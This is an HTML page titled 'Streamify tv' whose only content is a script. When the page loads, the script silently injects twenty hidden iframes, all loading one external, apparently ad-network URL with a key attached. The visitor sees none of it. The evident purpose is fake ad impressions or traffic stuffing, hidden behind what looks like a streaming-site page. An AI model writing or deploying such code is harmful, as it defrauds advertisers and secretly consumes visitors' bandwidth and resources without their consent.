<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Streamify tv</title>
  <style>
    body {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
    }

    iframe {
      width: 300px;
      height: 250px;
      border: 1px solid #ccc;
    }
  </style>
</head>
<body>

<script>
  const numberOfIframes = 20; // Change this number as needed
  const url = "https://misusesetupindecision.com/udg3h18q8?key=b9f42a3c0593fbd94b8db141e81adc6e";

  for (let i = 0; i < numberOfIframes; i++) {
    const iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.style.width = "100%";
    iframe.style.height = "30px";
    iframe.style.display ="none";
    document.body.appendChild(iframe);
  }
</script>

</body>
</html>
